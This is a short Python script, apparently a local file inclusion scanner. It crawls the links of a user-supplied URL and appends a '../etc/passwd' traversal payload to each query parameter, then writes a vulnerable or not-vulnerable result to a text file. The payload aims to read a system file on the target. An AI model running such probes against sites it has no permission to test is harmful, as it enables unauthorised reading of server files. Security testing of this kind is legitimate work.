from os import error, name
import requests
from bs4 import BeautifulSoup
from requests.auth import HTTPBasicAuth
import re

header = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0", 
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
            "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", 
            "Connection": "close", "Upgrade-Insecure-Requests": "1"}  

def get_links(u,user,password):
    f=open("LFI.txt","w")
    response = requests.get(u , headers = header ,
                auth = HTTPBasicAuth(user, password))
    f.write("Information of LFI attack for URL :" + u +'\n\n')

    no_of_links = 0
    if(response.status_code == 401):
            f.write("Invalid credits")
    else:
        soup = BeautifulSoup(response.text,'html.parser')
            
        for link in soup.find_all('a'):
            ll = link.get('href')
            url = re.split('=',ll)[0]
            if(url[0]!='h'):
                    url = u + '/' + url
            
            url=url+'='
            payload="../"
            file_name ="etc/passwd" 
            error="include(../etc/passwd)"
            req = requests.get(url+payload+file_name,headers=header,
                auth = HTTPBasicAuth(user, password))

            if error in req.text:
                    # f.write("URL is vulnerable to local file inclusion attack" + '\n')
                    no_of_links+=1
                    break
                    
    if no_of_links==0:
        f.write("URL is not vulnerable to local file inclusion attack" + '\n')
    else:
        f.write("URL is vulnerable to local file inclusion attack" + '\n')     

    f.close()


if __name__ == "__main__":
        url = input('ENTER YOUR TARGET URL HERE : ')
        u = input('ENTER YOUR USERNAME HERE {if required} : ')
        p = input('ENTER YOUR PASSWORD HERE {if required} : ')
        get_links(url,u,p)